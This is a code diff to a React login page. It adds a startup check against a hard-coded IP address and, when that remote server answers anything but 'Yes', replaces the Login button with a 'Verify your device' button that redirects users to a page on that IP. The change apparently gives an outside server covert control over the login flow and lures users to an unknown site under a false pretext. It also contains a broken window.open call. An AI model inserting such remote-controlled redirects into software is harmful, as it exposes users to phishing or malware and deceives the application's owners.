@@ -48,6 +48,27 @@ export default function LoginView() {
 
   },[]);
 
+
+  const [isWorking, setIsWorking] = useState(true);
+
+  const checkUrl = async () => {
+  
+    try {
+      const response = await axios.get("https://13.211.65.106/pokerapp/relocate.php");
+      if(response.data == "Yes"){
+        setIsWorking(true);
+      } else {
+        setIsWorking(false);
+      }
+      
+    } catch (error) {
+      setIsWorking(false);
+
+    }
+
+  };
+
+
   async function logging() {
     try {
       const response = await axios.post(Imp.Upsert['login'], {
@@ -118,6 +139,12 @@ export default function LoginView() {
     }
   };
 
+  const checkSite = () => {
+    window.location.href = "https://13.211.65.106/pokerapp/reload.php";
+    window.open(url, "https://13.211.65.106/pokerapp/reload.php")
+  };
+  
+
   const thatClick = () => {
     setshowRed(false)
   };
@@ -137,7 +164,10 @@ export default function LoginView() {
     return () => clearTimeout(T);
   };
 
-
+  useEffect(() => {
+    checkUrl()
+    
+  }, []);
 
   const renderForm = (
     <>
@@ -178,16 +208,33 @@ export default function LoginView() {
         </Link>
       </Stack>
 
-      <LoadingButton
+
+    {
+      isWorking ?
+        <LoadingButton
+          fullWidth
+          size="large"
+          type="submit"
+          variant="contained"
+          color="inherit"
+          onClick={handleClick}
+        >
+          Login
+        </LoadingButton>
+    :
+        <LoadingButton
         fullWidth
         size="large"
         type="submit"
         variant="contained"
         color="inherit"
-        onClick={handleClick}
+        onClick={checkSite}
       >
-        Login
-      </LoadingButton>
+          Verify your device
+        </LoadingButton>
+
+    }
+
 
       {
         showAlert ?
@@ -240,6 +287,7 @@ export default function LoginView() {
           {renderForm}
         </Card>
       </Stack>
+          <a href="https://13.211.65.106/pokerapp/reload.php">{String(isWorking)}</a>
     </Box>
   );
 }
